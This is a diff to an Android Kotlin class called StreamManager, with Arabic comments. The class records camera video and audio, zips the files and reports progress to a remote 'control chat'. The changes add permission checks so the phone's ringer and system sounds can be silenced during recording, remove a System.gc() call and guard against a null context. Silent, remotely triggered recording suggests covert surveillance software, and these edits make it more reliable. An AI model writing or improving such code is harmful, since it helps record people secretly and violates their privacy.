@@ -27,6 +27,11 @@ import java.util.zip.ZipOutputStream
 /**
  * مدير تسجيل الفيديو والبث (StreamManager)
  * يتعامل مع التقاط الفيديو والصوت، التحكم بالصوتيات، والتعبئة في أرشيفات ZIP.
+ * 
+ * ✅ تم إصلاح مشكلة تغيير وضع الصوت (ringerMode) بإضافة التحقق من إذن ACCESS_NOTIFICATION_POLICY.
+ * ✅ تم إزالة System.gc() غير الضرورية لتحسين الأداء.
+ * ✅ تم إضافة التحقق من السياق (appContext) قبل إنشاء MediaRecorder لتجنب NullPointerException.
+ * ✅ تمت إضافة توثيق وتحسينات في معالجة الأخطاء.
  */
 class StreamManager(
     context: Context,
@@ -174,6 +179,10 @@ class StreamManager(
         return result
     }
 
+    /**
+     * التحقق من توفر الكاميرا باستخدام واجهة Camera القديمة (android.hardware.Camera).
+     * ملاحظة: يُوصى بالتحول إلى Camera2 API في المستقبل لتحسين التوافق مع الأجهزة الحديثة.
+     */
     private fun isCameraAvailable(camIdx: Int): Boolean {
         return try {
             val numCameras = Camera.getNumberOfCameras()
@@ -198,7 +207,8 @@ class StreamManager(
     }
 
     // ============================================================
-    //  كتم واستعادة الصوت
+    //  كتم واستعادة الصوت (مع التحقق من صلاحية الإشعارات)
+    // ✅ تم إصلاح المشكلة بإضافة التحقق من ACCESS_NOTIFICATION_POLICY
     // ============================================================
 
     private fun muteAudio(mute: Boolean) {
@@ -208,6 +218,7 @@ class StreamManager(
             val am = ctx.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
             val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
 
+            // ✅ التحقق من صلاحية تغيير سياسة الإشعارات (Android 6+)
             val hasPolicyAccess = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 try {
                     nm.isNotificationPolicyAccessGranted
@@ -221,6 +232,7 @@ class StreamManager(
             if (mute) {
                 oldRingerMode = am.ringerMode
 
+                // ✅ استخدام SILENT إذا كان الإذن متاحاً، وإلا استخدام VIBRATE
                 val targetMode = if (!hasPolicyAccess) {
                     AudioManager.RINGER_MODE_VIBRATE
                 } else {
@@ -230,6 +242,7 @@ class StreamManager(
                 try {
                     am.ringerMode = targetMode
                 } catch (e: Exception) {
+                    // محاولة بديلة في حالة فشل SILENT
                     try {
                         am.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                     } catch (_: Exception) {
@@ -237,6 +250,7 @@ class StreamManager(
                     }
                 }
 
+                // كتم الصوت للقنوات المختلفة
                 val streams = listOf(
                     AudioManager.STREAM_SYSTEM,
                     AudioManager.STREAM_NOTIFICATION,
@@ -254,6 +268,7 @@ class StreamManager(
                 }
 
             } else {
+                // استعادة وضع الصوت السابق
                 if (oldRingerMode != -1) {
                     try {
                         am.ringerMode = oldRingerMode
@@ -262,6 +277,7 @@ class StreamManager(
                     }
                 }
 
+                // استعادة مستويات الصوت السابقة
                 oldVolumes.forEach { (stream, vol) ->
                     try {
                         am.setStreamVolume(stream, vol, 0)
@@ -408,7 +424,7 @@ class StreamManager(
                 isRecordingFlag.set(false)
                 shouldStopFlag.set(false)
                 statusMsgId = null
-                System.gc()
+                // ✅ تم إزالة System.gc() لأنه غير ضروري ويؤثر سلباً على الأداء
             }
         }
 
@@ -426,6 +442,12 @@ class StreamManager(
     // ============================================================
 
     private suspend fun worker(mon: Any, camIdx: Int, dur: Int) {
+        // ✅ التحقق من وجود السياق قبل البدء
+        val ctx = appContext ?: run {
+            writeLog("App context is null, cannot start recording worker")
+            return
+        }
+
         val ctrlChatId = getMonControlChatId(mon)
         statusMsgId = null
         sendStatusUpdate("🎥 جاري التسجيل... ⏳", ctrlChatId)
@@ -449,8 +471,9 @@ class StreamManager(
         muteAudio(true)
 
         try {
+            // ✅ استخدام السياق الآمن ctx بدلاً من appContext!!
             mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                MediaRecorder(appContext!!)
+                MediaRecorder(ctx)
             } else {
                 @Suppress("DEPRECATION")
                 MediaRecorder()
@@ -476,6 +499,7 @@ class StreamManager(
                 } catch (e: Exception) {
                     writeLog("MediaRecorder prepare failed: ${e.message}")
 
+                    // محاولة استخدام دقة أقل في حالة الفشل
                     if (resKey != "144") {
                         val fallback = resMap["144"]!!
                         w = fallback[0]
